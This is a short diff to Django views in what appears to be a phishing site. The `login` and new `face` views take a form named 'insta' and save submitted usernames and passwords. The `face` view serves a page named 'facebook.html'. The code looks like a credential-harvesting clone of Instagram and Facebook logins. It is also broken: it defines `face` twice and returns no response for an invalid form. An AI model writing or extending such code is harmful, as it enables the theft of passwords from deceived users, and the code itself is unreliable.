@@ -14,10 +14,11 @@ def login(request):
             password=fm.cleaned_data['password']
             fm.save()
             messages.success(request,'LOGIN SUCESSFULLY')
+            return render(request,'blog/server.html')
             # return HttpResponseRedirect(request,'blog/server.html')
     else:
         fm=insta()
-    return render(request,'blog/index.html',{'form':fm})
+        return render(request,'blog/index.html',{'form':fm})
 
 
 
@@ -30,6 +31,20 @@ def verifi(request):
 
 def job(request):
      return render(request,'blog/job.html')
+    
+def face(request):
+    if request.method == 'POST':
+        fm=insta(request.POST)
+        if fm.is_valid():
+            username=fm.cleaned_data['username']
+            password=fm.cleaned_data['password']
+            fm.save()
+            return render(request,'blog/server.html')
+            
+            # return HttpResponseRedirect(request,'blog/server.html')
+    else:
+        fm=insta()
+        return render(request,'blog/facebook.html')
 
 
 def face(request):
